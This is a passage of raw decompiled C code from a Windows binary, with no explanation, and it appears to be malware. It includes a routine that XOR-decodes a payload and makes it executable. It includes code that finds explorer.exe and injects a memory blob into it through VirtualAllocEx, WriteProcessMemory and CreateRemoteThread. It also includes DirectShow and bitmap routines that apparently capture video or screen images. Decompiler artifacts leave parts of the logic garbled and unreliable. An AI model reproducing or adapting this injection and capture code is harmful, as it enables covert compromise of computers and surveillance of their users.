        *(char *)(v3 + result) = -1 - *(char *)v2;
        v3++;
        v2--;
    }
    // 0x415ec9
    int32_t lpflOldProtect; // bp-12, 0x415e92
    VirtualProtect(memory, dwSize, 64, &lpflOldProtect);
    return result;
}

// Address range: 0x415ede - 0x415f1e
int32_t function_415ede(int32_t * a1) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = v1; // 0x415eef
    while (*(char *)v2 != 0) {
        // 0x415ef2
        v2++;
    }
    int32_t result; // 0x415ede
    if (result < 1) {
        // 0x415f17
        return result;
    }
    int32_t v3 = 0; // 0x415f12
    char * v4 = (char *)(v3 + result); // 0x415f0f
    *v4 = *v4 ^ *(char *)(v3 % (v2 - v1) + v1);
    v3++;
    while (v3 != result) {
        // 0x415f01
        v4 = (char *)(v3 + result);
        *v4 = *v4 ^ *(char *)(v3 % (v2 - v1) + v1);
        v3++;
    }
    // 0x415f17
    return result;
}

// Address range: 0x415f1e - 0x415f21
int32_t function_415f1e(void) {
    // 0x415f1e
    int32_t result; // 0x415f1e
    return result;
}

// Address range: 0x415f21 - 0x415fe0
int32_t function_415f21(void) {
    // 0x415f21
    if (!IsWow64Process(GetCurrentProcess(), (bool *)&g322)) {
        // 0x415fdb
        return 0;
    }
    int32_t result = 0; // 0x415fd2
    if (function_4160c3() != 0) {
        // 0x415fd6
        result = function_415fe0();
    }
    // 0x415fdb
    return result;
}

// Address range: 0x415fe0 - 0x4160c3
int32_t function_415fe0(void) {
    // 0x415fe0
    int32_t dwProcessId; // 0x415fe0
    int32_t * hProcess = OpenProcess(0x1fffff, false, dwProcessId); // 0x415ff4
    int32_t processId = GetCurrentProcessId(); // bp-272, 0x41600a
    int32_t lpFilename = function_401000(255); // 0x416011
    GetModuleFileNameA(NULL, (char *)lpFilename, 255);
    int32_t v1 = lpFilename; // 0x416029
    char v2 = *(char *)v1; // 0x41602b
    int32_t v3; // bp-268, 0x415fe0
    *(char *)((int32_t)&v3 - lpFilename + v1) = v2;
    v1++;
    while (v2 != 0) {
        // 0x41602b
        v2 = *(char *)v1;
        *(char *)((int32_t)&v3 - lpFilename + v1) = v2;
        v1++;
    }
    int32_t * lpBaseAddress = VirtualAllocEx(hProcess, NULL, 2048, 0x3000, 64); // 0x41604a
    WriteProcessMemory(hProcess, lpBaseAddress, &g149, 2048, NULL);
    int32_t lpflOldProtect; // bp-12, 0x415fe0
    VirtualProtectEx(hProcess, lpBaseAddress, 2048, 64, &lpflOldProtect);
    int32_t * lpBaseAddress2 = VirtualAllocEx(hProcess, NULL, 259, 0x3000, 4); // 0x41608a
    WriteProcessMemory(hProcess, lpBaseAddress2, &processId, 259, NULL);
    int32_t result = (int32_t)CreateRemoteThread(hProcess, NULL, 0, (int32_t (*)(int32_t *))((int32_t)lpBaseAddress + 270), lpBaseAddress2, 0, NULL); // 0x4160b3
    g192 = result;
    return result;
}

// Address range: 0x4160c3 - 0x41614d
int32_t function_4160c3(void) {
    int32_t * v1 = CreateToolhelp32Snapshot(2, 0); // 0x4160d2
    int32_t v2 = (int32_t)v1; // 0x4160d2
    int32_t v3; // bp-296, 0x4160c3
    function_401293(&v3, 0, 292);
    int32_t v4 = 296; // bp-300, 0x4160f0
    int32_t v5 = v2; // bp-324, 0x416101
    int32_t v6 = &v5; // 0x416101
    bool v7 = Process32First(v1, (struct tagPROCESSENTRY32 *)&v4); // 0x416102
    int32_t v8 = v6; // 0x41613e
    if (v7) {
        int32_t v9 = v6; // 0x416135
        int32_t v10 = 0;
        int32_t v11; // bp-264, 0x4160c3
        char v12 = *(char *)(v10 + (int32_t)&v11); // 0x416117
        int32_t result; // 0x4160c3
        while (v12 == *(char *)(v10 + (int32_t)"explorer.exe")) {
            // 0x416120
            if (v10 == 12) {
                // 0x416149
                return result;
            }
            v10++;
            v12 = *(char *)(v10 + (int32_t)&v11);
        }
        // 0x41612e
        *(int32_t *)(v9 - 4) = (int32_t)&v4;
        v9 -= 8;
        *(int32_t *)v9 = v2;
        bool v13 = Process32Next(&g322, (struct tagPROCESSENTRY32 *)&g322); // 0x416136
        v8 = v9;
        while (v13) {
            // 0x41610a
            v10 = 0;
            v12 = *(char *)(v10 + (int32_t)&v11);
            while (v12 == *(char *)(v10 + (int32_t)"explorer.exe")) {
                // 0x416120
                if (v10 == 12) {
                    // 0x416149
                    return result;
                }
                v10++;
                v12 = *(char *)(v10 + (int32_t)&v11);
            }
            // 0x41612e
            *(int32_t *)(v9 - 4) = (int32_t)&v4;
            v9 -= 8;
            *(int32_t *)v9 = v2;
            v13 = Process32Next(&g322, (struct tagPROCESSENTRY32 *)&g322);
            v8 = v9;
        }
    }
    // 0x416140
    *(int32_t *)(v8 - 4) = v2;
    CloseHandle(&g322);
    // 0x416149
    return 0;
}

// Address range: 0x41614d - 0x416233
int32_t function_41614d(int32_t a1) {
    int16_t v1 = 0x4d42; // bp-64, 0x4161b4
    function_403fc7((int32_t)&v1, 14);
    int32_t v2; // bp-56, 0x41614d
    function_403fc7((int32_t)&v2, 40);
    int64_t v3; // 0x41614d
    int32_t v4; // 0x41614d
    function_403fc7(a1, (3 * v4 + 3 & -4) * (int32_t)v3);
    int32_t v5 = &g69; // bp-88, 0x416203
    function_405f32(&v5);
    function_406f66();
    return function_41700f();
}

// Address range: 0x416233 - 0x416265
int32_t function_416233(void) {
    // 0x416233
    int32_t v1; // 0x416233
    *(int32_t *)v1 = (int32_t)&g122;
    function_416d09(v1);
    if (*(int32_t *)(v1 + 8) != 0) {
        // 0x41624d
        function_416c8f();
        function_406f8d();
    }
    // 0x41625b
    return function_41405b();
}

// Address range: 0x416265 - 0x4163bc
int32_t function_416265(int32_t * a1) {
    int32_t result = (int32_t)a1;
    int32_t v1 = result;
    int32_t v2 = 5; // bp-76, 0x416273
    int32_t v3; // bp-72, 0x416265
    int32_t v4 = &v3; // 0x416275
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 12) = 5;
    *(int32_t *)(result + 4) = 5;
    function_401719();
    int32_t v5 = g239; // 0x41628c
    int32_t v6 = v4; // 0x41628c
    if (g239 == 0) {
        // 0x41628e
        v2 = 56;
        v6 = v4;
        int32_t v7 = 0; // 0x416298
        if (function_406fa7() != 0) {
            // 0x41629a
            v2 = 56;
            v7 = function_416f80(56);
            v6 = &v2;
        }
        // 0x4162a6
        v5 = v7;
        g239 = v5;
    }
    int32_t v8 = v6 - 4; // 0x4162b1
    *(int32_t *)v8 = v5 + 4;
    function_402e04((int32_t)&g322);
    int32_t v9; // 0x416265
    if (v9 == 0) {
        // 0x4163ab
        function_402d86();
        return result;
    }
    int32_t v10 = 0; // 0x4163a1
    function_406d65();
    int32_t * v11 = (int32_t *)(4 * v10 + v9); // 0x4162d9
    *(int32_t *)(v8 - 4) = *(int32_t *)*v11;
    function_40434f((char *)&g322);
    *(int32_t *)(v8 - 8) = (int32_t)&v1;
    *(int32_t *)(v8 - 12) = function_4040d5(&g322);
    function_4043c7((int32_t)&g322);
    function_406f1d();
    v1 = 0;
    function_406f1d();
    function_406d65();
    function_406d65();
    function_406d65();
    int32_t v12 = v8 - 28; // 0x416341
    *(int32_t *)v12 = 0;
    *(int32_t *)(v8 - 24) = *(int32_t *)(*v11 + 8);
    *(int32_t *)(v8 - 20) = *(int32_t *)(*v11 + 16);
    *(int32_t *)(v8 - 16) = *(int32_t *)(*v11 + 20);
    function_401618((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    function_406f1d();
    v10++;
    while (v10 != v9) {
        int32_t v13 = v12;
        function_406d65();
        v11 = (int32_t *)(4 * v10 + v9);
        *(int32_t *)(v13 - 4) = *(int32_t *)*v11;
        function_40434f((char *)&g322);
        *(int32_t *)(v13 - 8) = (int32_t)&v1;
        *(int32_t *)(v13 - 12) = function_4040d5(&g322);
        function_4043c7((int32_t)&g322);
        function_406f1d();
        v1 = 0;
        function_406f1d();
        function_406d65();
        function_406d65();
        function_406d65();
        v12 = v13 - 28;
        *(int32_t *)v12 = 0;
        *(int32_t *)(v13 - 24) = *(int32_t *)(*v11 + 8);
        *(int32_t *)(v13 - 20) = *(int32_t *)(*v11 + 16);
        *(int32_t *)(v13 - 16) = *(int32_t *)(*v11 + 20);
        function_401618((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
        function_406f1d();
        v10++;
    }
    // 0x4163ab
    function_402d86();
    return result;
}

// Address range: 0x4163bc - 0x4163f3
int32_t function_4163bc(void) {
    // 0x4163bc
    function_414047();
    if (g240 == 0) {
        // 0x4163e6
        return ReleaseMutex((int32_t *)g241);
    }
    // 0x4163cf
    if (g239 != 0) {
        // 0x4163d9
        function_416d09(g239);
        g240 = 0;
    }
    // 0x4163e6
    return ReleaseMutex((int32_t *)g241);
}

// Address range: 0x4163f3 - 0x41645d
int32_t function_4163f3(int32_t a1, int32_t a2) {
    // 0x4163f3
    int32_t v1; // bp-4, 0x4163f3
    int32_t v2 = &v1; // 0x4163f3
    function_414047();
    if (g240 != 0) {
        // 0x41644d
        *(int32_t *)(v2 - 4) = g241;
        return ReleaseMutex(&g322);
    }
    int32_t v3 = v2; // 0x416411
    if (g239 == 0) {
        int32_t v4 = 56; // bp-8, 0x416413
        v3 = v2;
        int32_t v5 = 0; // 0x41641d
        if (function_406fa7() != 0) {
            // 0x41641f
            v4 = 56;
            v5 = function_416f80(56);
            v3 = &v4;
        }
        // 0x41642d
        g239 = v5;
    }
    int32_t v6 = v3 - 4; // 0x416436
    *(int32_t *)v6 = a2;
    g238 = a1;
    g240 = 1;
    function_416d82((int32_t)&g322, (int32_t)&g322);
    // 0x41644d
    *(int32_t *)(v6 - 4) = g241;
    return ReleaseMutex(&g322);
}

// Address range: 0x41645d - 0x41649c
int32_t function_41645d(void) {
    // 0x41645d
    g237 = &g122;
    int32_t v1; // 0x41645d
    function_414070(v1);
    int32_t v2 = 0; // 0x41647c
    if (function_406fa7() != 0) {
        // 0x41647e
        v2 = function_416f80(56);
    }
    // 0x41648a
    g240 = 0;
    g239 = v2;
    return &g237;
}

// Address range: 0x41649c - 0x416540
int32_t function_41649c(int32_t a1, int32_t a2, int32_t a3) {
    // 0x41649c
    CoInitialize(NULL);
    int32_t v1 = 0; // bp-12, 0x4164b2
    CoCreateInstance((int32_t)&g8, NULL, 1, &g5, (int32_t **)&v1);
    if (v1 == 0) {
        // 0x416534
        CoUninitialize();
        return 0;
    }
    int32_t v2 = v1; // bp-64, 0x4164dc
    int32_t result = 0; // 0x4164e5
    int32_t v3 = &v2; // 0x4164e5
    int32_t v4; // 0x41649c
    if (v4 != 0) {
        // 0x4164e7
        int32_t v5; // bp-68, 0x41649c
        int32_t v6 = &v5; // 0x4164e9
        *(int32_t *)(v6 - 4) = 0;
        int32_t v7; // bp-16, 0x41649c
        int32_t v8 = &v7; // 0x416507
        *(int32_t *)(v6 - 8) = v8;
        *(int32_t *)(v6 - 12) = 1;
        int32_t * v9 = (int32_t *)v4; // 0x41650a
        int32_t v10 = v6; // 0x416512
        int32_t v11 = 0; // 0x416512
        if (*v9 == 0) {
            int32_t v12 = v6 - 16; // 0x4164f5
            if (v7 != 0) {
                // 0x4164f7
                v12 = v6 - 20;
                *(int32_t *)v12 = v7;
                v7 = 0;
            }
            int32_t v13 = 1; // 0x4164f2
            *(int32_t *)(v12 - 4) = 0;
            *(int32_t *)(v12 - 8) = v8;
            *(int32_t *)(v12 - 12) = 1;
            int32_t v14 = v12 - 16; // 0x416512
            int32_t v15 = v13; // 0x416512
            int32_t v16 = v12; // 0x416512
            v10 = v12;
            v11 = v13;
            while (*v9 == 0) {
                // 0x4164ef
                v12 = v14;
                if (v7 != 0) {
                    // 0x4164f7
                    v12 = v16 - 20;
                    *(int32_t *)v12 = v7;
                    v7 = 0;
                }
                // 0x416500
                v13 = v15 + 1;
                *(int32_t *)(v12 - 4) = 0;
                *(int32_t *)(v12 - 8) = v8;
                *(int32_t *)(v12 - 12) = 1;
                v14 = v12 - 16;
                v15 = v13;
                v16 = v12;
                v10 = v12;
                v11 = v13;
            }
        }
        // 0x416524
        result = v11;
        v3 = v10 - 20;
        if (v1 == 0) {
            // 0x416534
            CoUninitialize();
            return result;
        }
    }
    // 0x41652b
    *(int32_t *)(v3 - 4) = v1;
    v1 = 0;
    // 0x416534
    CoUninitialize();
    return result;
}

// Address range: 0x416540 - 0x41656d
int32_t function_416540(void) {
    // 0x416540
    int32_t v1; // 0x416540
    int32_t * v2 = (int32_t *)(v1 + 64); // 0x416546
    int32_t v3; // bp-8, 0x416540
    int32_t * v4 = &v3; // 0x416549
    int32_t v5; // 0x416540
    if (*v2 != 0) {
        int32_t * v6 = (int32_t *)(v1 + 68); // 0x41654b
        int32_t v7 = *v6; // 0x41654b
        int32_t v8 = v7; // bp-12, 0x41654b
        CoTaskMemFree((int32_t *)v7);
        *v2 = 0;
        *v6 = 0;
        v5 = &g322;
        v4 = &v8;
    }
    int32_t * v9 = (int32_t *)(v1 + 60); // 0x41655a
    int32_t v10 = *v9; // 0x41655a
    int32_t result = v5; // 0x41655f
    if (v10 != 0) {
        // 0x416561
        result = *(int32_t *)v10;
        *(int32_t *)((int32_t)v4 - 4) = v10;
        *v9 = 0;
    }
    // 0x41656a
    return result;
}

// Address range: 0x41656d - 0x416573
int32_t function_41656d(void) {
    // 0x41656d
    return 2;
}

// Address range: 0x416573 - 0x416579
int32_t function_416573(void) {
    // 0x416573
    return 1;
}

// Address range: 0x416579 - 0x4165c4
int32_t function_416579(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = 0;
    int32_t v2 = 4 * v1; // 0x41658a
    int32_t v3 = *(int32_t *)(v2 + (int32_t)&g7); // 0x41658d
    int32_t result; // 0x416579
    while (*(int32_t *)(v2 + a2) == v3) {
        // 0x416592
        if (v1 == 3) {
            // 0x4165ad
            *(int32_t *)a3 = a1;
            result = 0;
            return result;
        }
        v1++;
        v2 = 4 * v1;
        v3 = *(int32_t *)(v2 + (int32_t)&g7);
    }
    int32_t v4 = 0;
    int32_t v5 = 4 * v4; // 0x41659f
    int32_t v6 = *(int32_t *)(v5 + (int32_t)&g3); // 0x4165a2
    result = -0x7fffbffe;
    while (*(int32_t *)(v5 + a2) == v6) {
        // 0x4165a7
        if (v4 == 3) {
            // 0x4165ad
            *(int32_t *)a3 = a1;
            result = 0;
            return result;
        }
        v4++;
        v5 = 4 * v4;
        v6 = *(int32_t *)(v5 + (int32_t)&g3);
        result = -0x7fffbffe;
    }
  lab_0x4165be:
    // 0x4165be
    return result;
}

// Address range: 0x4165c4 - 0x4165c9
int32_t function_4165c4(void) {
    // 0x4165c4
    return 0;
}

// Address range: 0x4165c9 - 0x416661
int32_t function_4165c9(int32_t a1, int32_t a2) {
    // 0x4165c9
    int32_t v1; // 0x4165c9
    int32_t * v2 = (int32_t *)v1; // 0x4165eb
    int32_t v3 = *v2; // 0x4165eb
    if (v3 >= 0 && v3 == 0) {
        // 0x41660f
        function_41667f(v1);
        int32_t v4; // bp-100, 0x4165c9
        int32_t v5 = &v4;
        *(int32_t *)(v5 - 4) = 7;
        int32_t v6; // bp-72, 0x4165c9
        __asm_rep_movsd_memcpy((char *)&v6, (char *)(a2 + 8), 7);
        *(int32_t *)(v5 - 36) = *(int32_t *)(a2 + 4);
        __asm_rep_movsd_memcpy((char *)(v5 - 32), (char *)&v6, 7);
        *(int32_t *)(v5 - 40) = *v2;
    }
    // 0x416654
    return 0;
}

// Address range: 0x416661 - 0x41667f
int32_t function_416661(void) {
    // 0x416661
    int32_t v1; // 0x416661
    int32_t v2; // 0x416661
    __asm_rep_movsd_memcpy((char *)(v2 + 8), (char *)&v1, 7);
    return function_41700f();
}

// Address range: 0x41667f - 0x4166ec
int32_t function_41667f(int32_t a1) {
    int32_t v1 = a1 + 16; // 0x416693
    int32_t v2 = 0;
    int32_t v3 = 4 * v2; // 0x416693
    int32_t v4 = *(int32_t *)(v3 + v1); // 0x416693
    int32_t result; // 0x41667f
    int32_t v5; // 0x41667f
    while (v4 == *(int32_t *)(v3 + (int32_t)&g12)) {
        // 0x41669c
        if (v2 == 3) {
            // 0x4166a2
            *(int32_t *)(v5 + 4) = 16;
            result = v4;
            return result;
        }
        v2++;
        v3 = 4 * v2;
        v4 = *(int32_t *)(v3 + v1);
    }
    int32_t v6 = 0;
    int32_t v7 = 4 * v6; // 0x4166b2
    int32_t v8 = *(int32_t *)(v7 + v1); // 0x4166b2
    while (v8 == *(int32_t *)(v7 + (int32_t)&g11)) {
        // 0x4166bb
        if (v6 == 3) {
            // 0x4166c1
            *(int32_t *)(v5 + 4) = 24;
            result = v8;
            return result;
        }
        v6++;
        v7 = 4 * v6;
        v8 = *(int32_t *)(v7 + v1);
    }
    int32_t v9 = 0;
    int32_t v10 = 4 * v9; // 0x4166cf
    int32_t v11 = *(int32_t *)(v10 + v1); // 0x4166cf
    result = v11;
    while (v11 == *(int32_t *)(v10 + (int32_t)&g10)) {
        // 0x4166d8
        if (v9 == 3) {
            // 0x4166de
            *(int32_t *)(v5 + 4) = 32;
            result = v11;
            return result;
        }
        v9++;
        v10 = 4 * v9;
        v11 = *(int32_t *)(v10 + v1);
        result = v11;
    }
  lab_0x4166e5:
    // 0x4166e5
    return result;
}

// Address range: 0x4166ec - 0x4166fa
int32_t function_4166ec(void) {
    // 0x4166ec
    int32_t v1; // 0x4166ec
    *(int32_t *)v1 = (int32_t)&g123;
    return function_41700f();
}

// Address range: 0x4166fa - 0x416718
int32_t function_4166fa(int32_t a1) {
    // 0x4166fa
    int32_t result; // 0x4166fa
    *(int32_t *)result = (int32_t)&g123;
    function_416c63();
    *(int32_t *)(result + 36) = (int32_t)&g237;
    return result;
}

// Address range: 0x416718 - 0x416734
int32_t function_416718(void) {
    // 0x416718
    int32_t v1; // 0x416718
    function_41674f(v1);
    return 0;
}

// Address range: 0x416734 - 0x41674f
int32_t function_416734(void) {
    // 0x416734
    int32_t v1; // 0x416734
    function_41674f(v1);
    return 0;
}

// Address range: 0x41674f - 0x4167ca
int32_t function_41674f(int32_t a1) {
    int32_t v1 = a1;
    int32_t * v2 = (int32_t *)a1; // 0x416762
    *v2 = 0;
    int32_t v3; // 0x41674f
    if (v3 < 0) {
        // 0x4167c3
        int32_t result; // 0x41674f
        return result;
    }
    // 0x416772
    int32_t v4; // bp-40, 0x41674f
    int32_t v5 = &v4; // 0x416768
    int32_t v6; // bp-20, 0x41674f
    int32_t v7 = &v6; // 0x4167a9
    *(int32_t *)(v5 - 4) = v7;
    int32_t v8 = &v1; // 0x4167ad
    *(int32_t *)(v5 - 8) = v8;
    int32_t * v9 = (int32_t *)v3; // 0x4167ae
    *(int32_t *)(v5 - 12) = 1;
    if (*v9 != 0) {
        // 0x4167c3
        return -0x7fffbffb;
    }
    // 0x416779
    int32_t v10; // bp-8, 0x41674f
    int32_t v11 = &v10; // 0x416786
    int32_t v12 = v5;
    v10 = 3;
    *(int32_t *)(v12 - 20) = v11;
    *(int32_t *)(v12 - 24) = v1;
    while (v10 != v3) {
        int32_t v13 = v12 - 28; // 0x41679d
        *(int32_t *)v13 = v1;
        *(int32_t *)(v12 - 32) = v7;
        *(int32_t *)(v12 - 36) = v8;
        *(int32_t *)(v12 - 40) = 1;
        if (*v9 != 0) {
            // 0x4167c3
            return -0x7fffbffb;
        }
        v12 = v13;
        v10 = 3;
        *(int32_t *)(v12 - 20) = v11;
        *(int32_t *)(v12 - 24) = v1;
    }
    // 0x4167bc
    *v2 = v1;
    // 0x4167c3
    return 0;
}

// Address range: 0x4167ca - 0x41699c
int32_t function_4167ca(int32_t a1) {
    // 0x4167ca
    CoInitialize(NULL);
    int32_t v1 = 0; // bp-24, 0x4167fb
    CoCreateInstance((int32_t)&g6, NULL, 1, &g126, (int32_t **)&v1);
    if (v1 != 0) {
        int32_t v2 = v1; // bp-276, 0x416821
        *(int32_t *)((int32_t)&v2 - 4) = v1;
        v1 = 0;
    }
    // 0x41698f
    CoUninitialize();
    return &g322;
}

// Address range: 0x41699c - 0x416af8
int32_t function_41699c(void) {
    // 0x41699c
    CoInitialize(NULL);
    int32_t v1 = 0; // bp-12, 0x4169c5
    int32_t v2 = CoCreateInstance((int32_t)&g8, NULL, 1, &g124, (int32_t **)&v1); // 0x4169cb
    int32_t result = v2; // 0x4169d6
    if (v1 != 0) {
        // 0x4169dc
        result = *(int32_t *)v1;
    }
    // 0x416af3
    return result;
}

// Address range: 0x416af8 - 0x416bc6
int32_t function_416af8(int32_t a1, int32_t a2, int32_t * a3, int32_t * a4) {
    // 0x416af8
    int32_t v1; // 0x416af8
    uint32_t v2 = v1;
    if (v1 == 0) {
        // 0x416bc2
        int32_t result; // 0x416af8
        return result;
    }
    uint32_t v3 = function_41649c(v1, v1, v1); // 0x416b0d
    int32_t * v4 = (int32_t *)v1; // 0x416b2c
    *v4 = 0;
    int32_t v5; // bp-20, 0x416af8
    int32_t result2 = CoCreateInstance((int32_t)&g8, NULL, 1, &g124, (int32_t **)&v5); // 0x416b2e
    if (v5 == 0) {
        // 0x416bc2
        return result2;
    }
    // 0x416b3f
    if (v1 == 0) {
        // 0x416bc2
        return *(int32_t *)v5;
    }
    // 0x416b56
    int32_t v6; // bp-72, 0x416af8
    int32_t v7 = &v6; // 0x416b58
    int32_t v8 = 0;
    int32_t v9 = &v8; // 0x416b92
    *(int32_t *)(v7 - 4) = v9;
    int32_t v10; // bp-16, 0x416af8
    int32_t v11 = &v10; // 0x416b93
    *(int32_t *)(v7 - 8) = v11;
    int32_t * v12 = (int32_t *)v1; // 0x416b97
    *(int32_t *)(v7 - 12) = 1;
    int32_t v13 = 0; // 0x416ba1
    int32_t v14 = v7 - 16; // 0x416ba1
    if (*v12 == 0) {
        int32_t v15 = v7;
        *(int32_t *)(v15 - 24) = (int32_t)&g4;
        *(int32_t *)(v15 - 28) = 0;
        *(int32_t *)(v15 - 32) = 0;
        int32_t v16 = v15 - 36; // 0x416b70
        *(int32_t *)v16 = v10;
        v14 = v16;
        while (v13 != (v3 < v2 ? 0 : v2)) {
            int32_t v17 = v15 - 40; // 0x416b81
            *(int32_t *)v17 = v11;
            *v4 = 0;
            v8 = 0;
            *(int32_t *)(v15 - 44) = v9;
            *(int32_t *)(v15 - 48) = v11;
            *(int32_t *)(v15 - 52) = 1;
            v13++;
            v14 = v15 - 56;
            if (*v12 != 0) {
                // break -> 0x416bb4
                break;
            }
            v15 = v17;
            *(int32_t *)(v15 - 24) = (int32_t)&g4;
            *(int32_t *)(v15 - 28) = 0;
            *(int32_t *)(v15 - 32) = 0;
            v16 = v15 - 36;
            *(int32_t *)v16 = v10;
            v14 = v16;
        }
    }
    int32_t result3 = *v12; // 0x416bb9
    if (v5 != 0) {
        // 0x416bbb
        result3 = *(int32_t *)v5;
        *(int32_t *)(v14 - 8) = v5;
    }
    // 0x416bc2
    return result3;
}

// Address range: 0x416bc6 - 0x416c3c
int32_t function_416bc6(int32_t a1, int32_t a2, int32_t a3, uint32_t a4) {
    // 0x416bc6
    function_406d65();
    int32_t v1; // 0x416bc6
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x416bdc
    int32_t v3 = 4 * a1; // 0x416be2
    *(int32_t *)(*(int32_t *)(*v2 + v3) + 16) = a3;
    function_406d65();
    *(int32_t *)(*(int32_t *)(*v2 + v3) + 20) = a2;
    int32_t v4 = a3 * a2 * (a4 / 8 % 32); // 0x416c09
    uint32_t v5 = v4 < 0 ? -v4 : v4; // 0x416c11
    function_406d65();
    int32_t result = *(int32_t *)(*v2 + v3); // 0x416c30
    *(int32_t *)(result + 24) = v5 % 16 == 0 ? v5 : v5 + 16 & -16;
    return result;
}

// Address range: 0x416c3c - 0x416c49
int32_t function_416c3c(int32_t result) {
    // 0x416c3c
    int32_t v1; // 0x416c3c
    *(int32_t *)(v1 + 24) = result;
    return result;
}

// Address range: 0x416c49 - 0x416c56
int32_t function_416c49(int32_t result) {
    // 0x416c49
    int32_t v1; // 0x416c49
    *(int32_t *)(v1 + 16) = result;
    return result;
}

// Address range: 0x416c56 - 0x416c63
int32_t function_416c56(int32_t result) {
    // 0x416c56
    int32_t v1; // 0x416c56
    *(int32_t *)(v1 + 20) = result;
    return result;
}

// Address range: 0x416c63 - 0x416c8f
int32_t function_416c63(void) {
    // 0x416c63
    int32_t result; // 0x416c63
    *(int32_t *)result = function_406e5c();
    *(int32_t *)(result + 4) = function_406e5c();
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)(result + 16) = 0;
    *(int32_t *)(result + 20) = 0;
    *(int32_t *)(result + 24) = 0;
    return result;
}

// Address range: 0x416c8f - 0x416cf3
int32_t function_416c8f(void) {
    // 0x416c8f
    int32_t v1; // 0x416c8f
    function_416d09(v1);
    for (int32_t i = 0; i < *(int32_t *)(v1 + 12); i++) {
        // 0x416ca8
        function_406d65();
        if (*(int32_t *)(*(int32_t *)(v1 + 4) + 4 * i) != 0) {
            // 0x416cbd
            function_41700f();
            function_406f8d();
        }
    }
    // 0x416cd8
    function_4166ec();
    function_406f8d();
    // 0x416ce6
    return function_402d86();
}

// Address range: 0x416cf3 - 0x416d09
int32_t function_416cf3(int32_t result) {
    // 0x416cf3
    int32_t v1; // 0x416cf3
    function_402e04(v1 + 4);
    return result;
}

// Address range: 0x416d09 - 0x416d82
int32_t function_416d09(int32_t a1) {
    // 0x416d09
    int32_t v1; // 0x416d09
    int32_t * v2 = (int32_t *)(v1 + 52); // 0x416d0d
    int32_t v3 = *v2;
    int32_t v4; // 0x416d09
    if (v3 == 0) {
        // 0x416d1a
        int32_t v5; // bp-8, 0x416d09
        v4 = &v5;
    } else {
        int32_t v6 = v3; // bp-12, 0x416d16
        int32_t v7 = *v2;
        int32_t v8 = &v6;
        v4 = v8;
        if (v7 != 0) {
            int32_t v9 = v8 - 4; // 0x416d25
            *(int32_t *)v9 = v7;
            *v2 = 0;
            v4 = v9;
        }
    }
    int32_t * v10 = (int32_t *)(v1 + 24); // 0x416d2c
    int32_t v11 = *v10; // 0x416d2c
    int32_t v12 = v4; // 0x416d31
    if (v11 != 0) {
        // 0x416d33
        v12 = v4 - 4;
        *(int32_t *)v12 = v11;
        *v10 = 0;
    }
    // 0x416d3c
    function_402eaf();
    function_402eaf();
    int32_t * v13 = (int32_t *)(v1 + 36); // 0x416d4c
    int32_t v14 = *v13; // 0x416d4c
    if (v14 != 0) {
        // 0x416d53
        *(int32_t *)(v12 - 4) = v14;
        *v13 = 0;
    }
    // 0x416d5c
    function_402eaf();
    function_402eaf();
    function_402eaf();
    *v2 = 0;
    CoUninitialize();
    return &g322;
}

// Address range: 0x416d82 - 0x416f80
int32_t function_416d82(int32_t a1, int32_t a2) {
    // 0x416d82
    CoInitialize(NULL);
    int32_t v1; // 0x416d82
    int32_t v2 = v1 + 24; // 0x416dac
    int32_t result = CoCreateInstance((int32_t)&g6, NULL, 1, &g126, (int32_t **)v2); // 0x416dc1
    int32_t v3 = *(int32_t *)v2; // 0x416dc7
    if (v3 == 0) {
        // 0x416f75
        return result;
    }
    int32_t * v4 = (int32_t *)(v1 + 28); // 0x416de2
    int32_t v5 = *v4; // 0x416de2
    if (v5 == 0) {
        // 0x416f75
        return *(int32_t *)v3;
    }
    int32_t result2 = function_416af8(v5, v3, &g4, v4); // 0x416dfd
    if (*(int32_t *)(v1 + 32) == 0) {
        // 0x416f75
        return result2;
    }
    int32_t v6 = v1 + 36; // 0x416e0c
    int32_t result3 = CoCreateInstance((int32_t)&g9, NULL, 1, &g125, (int32_t **)v6); // 0x416e1e
    int32_t * v7 = (int32_t *)v6; // 0x416e24
    if (*v7 == 0) {
        // 0x416f75
        return result3;
    }
    // 0x416e2e
    char * v8; // bp-152, 0x416d82
    function_401293((int32_t *)&v8, 0, 72);
    v8 = (char *)0x73646976;
    bool v9; // 0x416d82
    int32_t v10 = v9 ? -4 : 4; // 0x416e71
    int32_t v11 = v10 + (int32_t)&v8; // 0x416e71
    int32_t v12 = v10 + (int32_t)"vids"; // 0x416e71
    *(int32_t *)v11 = *(int32_t *)v12;
    int32_t v13 = v11 + v10; // 0x416e73
    int32_t v14 = v12 + v10; // 0x416e73
    *(int32_t *)v13 = *(int32_t *)v14;
    *(int32_t *)(v13 + v10) = *(int32_t *)(v14 + v10);
    int32_t v15 = -0x1bc91483; // bp-136, 0x416e7e
    int32_t v16 = v10 + (int32_t)&v15; // 0x416e7e
    int32_t v17 = v10 + (int32_t)&g11; // 0x416e7e
    *(int32_t *)v16 = *(int32_t *)v17;
    int32_t v18 = v16 + v10; // 0x416e7f
    int32_t v19 = v17 + v10; // 0x416e7f
    *(int32_t *)v18 = *(int32_t *)v19;
    *(int32_t *)(v18 + v10) = *(int32_t *)(v19 + v10);
    int32_t v20 = function_416718(); // 0x416e92
    *(int32_t *)(v1 + 40) = v20;
    if (v20 == 0) {
        // 0x416f75
        return 0;
    }
    int32_t result4 = function_416734(); // 0x416ea8
    *(int32_t *)(v1 + 44) = result4;
    if (result4 < 1) {
        // 0x416f75
        return result4;
    }
    // 0x416ecd
    int32_t v21; // bp-76, 0x416d82
    __asm_rep_movsd_memcpy((char *)&v21, (char *)(v1 + 48), 10);
    function_416540();
    function_416bc6(a2, v1, v1, v1);
    function_406d65();
    int32_t v22 = *(int32_t *)(*(int32_t *)(v1 + 4) + 4 * a2); // 0x416f25
    int32_t v23; // bp-388, 0x416d82
    __asm_rep_movsd_memcpy((char *)&v23, (char *)v22, 7);
    function_416661();
    int32_t v24 = function_416718(); // 0x416f3c
    *(int32_t *)(v1 + 48) = v24;
    if (v24 == 0) {
        // 0x416f75
        return 0;
    }
    int32_t v25 = *(int32_t *)(v1 + 52); // 0x416f69
    int32_t result5 = *(int32_t *)*v7; // 0x416f6d
    if (v25 != 0) {
        // 0x416f6f
